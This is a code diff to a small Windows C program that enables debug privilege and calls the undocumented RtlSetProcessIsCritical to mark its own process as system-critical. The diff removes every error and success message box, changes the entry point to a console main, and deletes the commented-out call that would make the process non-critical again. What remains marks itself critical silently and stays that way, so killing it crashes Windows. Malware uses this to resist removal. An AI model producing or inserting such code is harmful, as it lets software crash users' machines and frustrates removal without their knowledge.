@@ -44,20 +44,15 @@ typedef long (WINAPI *RtlSetProcessIsCritical)(IN BOOLEAN bNew, OUT BOOLEAN* pbO
 typedef BOOL (WINAPI *RtlAdjustPrivilege)(ULONG, BOOL, BOOL, PBOOLEAN);
 
 
-//////////////////////////////////////////////////////////////////////////
-// Main function
-//////////////////////////////////////////////////////////////////////////
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
     // Enable the SE_DEBUG_NAME privilege
-    if (EnablePriv(SE_DEBUG_NAME) != TRUE) {
-        MessageBox(NULL, "Could not enable SE_DEBUG_NAME privilege!", "Error", MB_ICONEXCLAMATION | MB_OK);
+    if (EnablePriv((LPCSTR)SE_DEBUG_NAME) != TRUE) {
         return 0;
     }
 
     // Load ntdll.dll so we can access the function
     HANDLE ntdll = LoadLibrary("ntdll.dll");
     if (ntdll == NULL) {
-        MessageBox(NULL, "Could not load ntdll.dll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
@@ -66,13 +61,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
 
     if (!SetCriticalProcess) {
-        MessageBox(NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
     RtlAdjustPrivilege AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
     if (!AdjustPrivilege) {
-        MessageBox(NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
@@ -81,11 +74,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // Call it - enable system critical status
     SetCriticalProcess(TRUE, NULL, FALSE);
-    // MessageBox(NULL, "Process is now system critical.\nPress OK to return it back to normal.", "Success!", MB_ICONINFORMATION | MB_OK);
-
-    // // Call it again - disable system critical status
-    // SetCriticalProcess(FALSE, NULL, FALSE);
-    // MessageBox(NULL, "Process is now un-critical.\nPress OK to exit.", "Success!", MB_ICONINFORMATION | MB_OK);
 
     return 0;
 }
